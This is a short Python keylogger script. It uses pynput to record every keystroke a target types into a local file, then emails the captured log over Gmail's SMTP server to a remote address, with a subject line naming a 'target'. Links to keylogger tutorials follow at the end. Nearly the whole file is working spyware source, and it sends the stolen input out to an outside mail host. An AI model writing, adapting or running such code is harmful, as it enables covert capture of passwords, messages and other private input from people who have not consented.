from pynput import keyboard #This library allows you to control and monitor input devices.
import smtplib,ssl #The smtplib module defines an SMTP client session object that can be used to send mail to any internet machine with an SMTP
s_mail = "xyz@gmail.com"
r_mail = "abc@gmail.com"
pass_s = "ur password"
port = 587 #smtp port number
msg = """ 
Subject = Keylogs_target_xyz
"""
def write(text):
    with open('keylogger.txt','a') as f:
        f.write(text)
        f.close()

def key_press(Key):
    try:
        if(Key == keyboard.Key.enter):
            write("\n")
        else:
            write(Key.char)
    except AttributeError:
        if (Key == keyboard.Key.backspace):
            write("\n Backspace \n")
        elif(Key == keyboard.Key.tab):
            write("\n Tab \n")
        elif(Key == keyboard.Key.space):
            write(" <space> ")
        else:
            temp = repr(Key)+" Pressed.\n"
            write(temp)
            # print("\n{} Pressed\n".format(Key))

def on_key_release(Key):
    if(Key == keyboard.Key.esc):
        return False    
with keyboard.Listener(on_press= key_press,on_release= on_key_release) as listener:
    listener.join()   
with open("keylogger.txt",'r') as f:
    temp = f.read()
    msg = msg + str(temp)
    f.close()

context = ssl.create_default_context()
server = smtplib.SMTP('smtp.gmail.com', port)
server.starttls()
server.login(s_mail,pass_s)
server.sendmail(s_mail,r_mail,msg)
print("Email Sent to ",s_mail)
server.quit()


"""
Other ways---
https://www.geeksforgeeks.org/design-a-keylogger-in-python/#:~:text=Keystroke%20logging%20is%20the%20process,with%20computers%20and%20business%20networks.
https://www.thepythoncode.com/article/write-a-keylogger-python
and much more..............
"""